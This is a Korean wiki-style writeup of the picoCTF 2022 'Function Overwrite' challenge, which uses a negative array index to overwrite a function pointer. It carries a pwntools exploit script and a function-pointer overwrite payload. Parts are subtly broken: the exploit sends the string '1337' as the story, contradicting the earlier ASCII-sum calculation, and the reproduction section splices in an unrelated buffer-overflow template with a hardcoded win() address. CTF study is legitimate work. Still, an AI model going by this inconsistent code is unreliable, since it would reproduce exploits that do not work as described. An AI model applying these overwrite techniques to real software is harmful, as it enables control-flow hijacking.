---
title: Function Overwrite — picoCTF 2022 pwn writeup
created: 2026-06-15
updated: 2026-06-16
type: query
tags: [ctf, pwn, arbitrary-write, function-pointer, out-of-bounds, picoctf]
sources: [https://picoctf2022.haydenhousen.com/binary-exploitation/function-overwrite, https://cryptocat.me/blog/ctf/2022/pico/pwn/function_overwrite/]
confidence: high
---

# Function Overwrite — picoCTF 2022 pwn writeup

> `Function Overwrite`는 **배열 인덱스 검사가 불완전해서 음수 인덱스로 함수 포인터를 덮고, `easy_checker`로 제어 흐름을 바꾸는 picoCTF 2022 Binary Exploitation 문제**입니다. 핵심은 **arbitrary-ish write + function pointer hijack**입니다.

## 1. 핵심 요약

- 프로그램은 스토리(문자열)와 숫자 2개를 입력받습니다.
- 두 번째 숫자는 `fun[]` 배열의 인덱스입니다.
- 상한만 검사하고 하한은 검사하지 않아 음수 인덱스로 **배열 밖 메모리**에 쓸 수 있습니다.
- `check` 함수 포인터가 `fun[]` 바로 위에 있어 덮을 수 있습니다.
- `hard_checker`를 `easy_checker`로 바꾸면 flag를 출력합니다.

## 2. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2022 |
| 분류 | pwn / binary exploitation |
| 핵심 요소 | out-of-bounds write, function pointer overwrite, control-flow hijack |
| 입력 | story 문자열 + 배열 인덱스 + 덧셈 값 |
| 목표 | `check` 포인터를 `easy_checker`로 변경 |

## 3. 공격 흐름

1. `story`에 충분한 점수를 주는 문자열을 만듭니다.
2. `fun[-1]`, `fun[-2]`처럼 음수 인덱스를 시도합니다.
3. `check` 함수 포인터가 배열 위쪽에 있는지 확인합니다.
4. `easy_checker - hard_checker` 차이를 더해 함수 포인터를 바꿉니다.
5. `easy_checker`가 호출되면 flag가 출력됩니다.

## 4. 점수 맞추기

`hard_checker`는 1337 점을 요구합니다. `story` 점수는 문자열의 ASCII 합으로 계산되므로, 부족한 점수만큼 문자를 조합합니다.

```python
# ASCII 합을 맞춰 1337을 만들기 위한 예시입니다.
base = b'aaaaaaaaaaaaa'  # 예상: 1261점
need = 1337 - 1261       # 부족한 점수 계산
story = base + b'L'      # 'L'의 ASCII 값 76을 더해 1337을 맞춥니다.
```

## 5. 익스플로잇 예시

```python
from pwn import *  # pwntools를 불러옵니다.

elf = context.binary = ELF('./vuln')  # 로컬 바이너리를 로드합니다.
io = process(elf.path)               # 로컬에서 실행합니다.

# 1) 점수를 1337로 맞추는 문자열을 보냅니다.
io.sendlineafter(b'>', b'1337')       # 예상: 첫 번째 프롬프트에 점수 문자열 입력

# 2) 음수 인덱스로 check 포인터 근처를 노립니다.
io.sendlineafter(b'.', b'-16')        # 예상: 배열 밖 메모리를 건드립니다.

# 3) easy_checker로 가는 차이값을 더합니다.
io.sendline(b'-250')                  # 예상: check 포인터가 easy_checker로 변경됩니다.

# 4) 결과를 확인합니다.
io.recvlines(2)                       # 예상: flag 출력 또는 성공 메시지
print(io.recv().decode(errors='ignore'))
```

## 6. 왜 가능한가

- 인덱스 상한만 검사하고 음수는 막지 않았습니다.
- `fun[]`와 `check` 포인터의 메모리 배치가 근접했습니다.
- 함수 포인터는 작은 델타만 더해도 다른 함수로 바꿀 수 있습니다.
- 결과적으로 **임의 주소 쓰기처럼 보이는 원시 원자성**을 얻습니다.


## 재현 절차

1. 덮어쓸 함수 포인터와 목표 함수를 확인합니다.
```bash
# 심볼과 함수 배치를 먼저 확인합니다.
nm -n ./vuln | grep -E "win|func|target"  # 예상: 관련 심볼 주소가 출력됩니다.
```
2. 입력으로 함수 포인터를 덮어쓰는 페이로드를 만듭니다.
```python
# 함수 포인터 overwrite의 기본 형태입니다.
from pwn import *
payload = b"A" * 64          # 예시: 포인터 위치까지 채웁니다.
payload += p32(0x080491f6)    # 예시: win() 주소입니다.
print(payload)
```
3. overwrite 후 목표 함수가 실행되는지 확인합니다.
## 7. 방어 관점 메모

- 배열 인덱스는 하한/상한 모두 검사해야 합니다.
- 함수 포인터를 직접 조작 가능한 구조는 위험합니다.
- `easy_checker`처럼 우회 가능한 보조 함수가 있으면 보안 경계가 약해집니다.
- 정적 분석 시 `check` 같은 포인터가 배열 근처에 있는지 반드시 확인해야 합니다.

## 8. 비교 포인트

- `Flag Leak`은 **정보 유출형 pwn**입니다.
- `PIE TIME`은 **주소 계산형 pwn**입니다.
- `Handoff`는 **ret2reg + shellcode 실행형 pwn**입니다.
- `Function Overwrite`는 **function pointer hijack / out-of-bounds write형 pwn**입니다.

## 9. 참고 자료

- [Hayden Housen — function overwrite | PicoCTF-2022 Writeup](https://picoctf2022.haydenhousen.com/binary-exploitation/function-overwrite)
- [CryptoCat — Arbitrary Function Pointer Overwrite | PicoCTF 2022](https://cryptocat.me/blog/ctf/2022/pico/pwn/function_overwrite/)
- [[function-pointer-overwrite-ctf-patterns]]
- [[exploitation]]
